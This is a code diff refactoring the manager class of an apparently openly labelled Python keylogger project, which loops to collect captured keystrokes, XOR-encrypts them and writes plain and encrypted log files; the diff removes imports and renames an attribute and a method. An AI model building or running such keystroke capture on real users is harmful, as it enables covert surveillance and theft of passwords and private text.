@@ -1,10 +1,6 @@
 import time
 from datetime import datetime
 
-from keylogger.encryptors import XorEncryption
-from keylogger.keyloggers import SimpleKeylogger
-from keylogger.logwriters import JsonLogWriter
-
 
 class KeyLoggerManager:
     """
@@ -31,7 +27,7 @@ class KeyLoggerManager:
         """
         self.keylogger = keylogger
         self.log_writer = log_writer
-        self.encrypted_log_writer = encrypted_log_writer
+        self.writer_for_encrypted_log = encrypted_log_writer
         self.encryptor = encryptor
         self.interval = interval
         self.running = False
@@ -44,7 +40,7 @@ class KeyLoggerManager:
         try:
             while self.running and self.keylogger.running:
                 time.sleep(self.interval)
-                self.collect_and_store_logs()
+                self._collect_and_store_logs()
         except KeyboardInterrupt:
             self.stop()
 
@@ -54,7 +50,7 @@ class KeyLoggerManager:
         self.keylogger.stop()
         print("Keylogger Manager stopped.")
 
-    def collect_and_store_logs(self):
+    def _collect_and_store_logs(self):
         """Collects keystrokes, processes them, and writes to log files."""
         logs = self.keylogger.get_log()
         if not logs:
@@ -68,4 +64,4 @@ class KeyLoggerManager:
 
         # Write to log writers
         self.log_writer.write_log(log_entry)
-        self.encrypted_log_writer.write_log(encrypted_logs)
+        self.writer_for_encrypted_log.write_log(encrypted_logs)
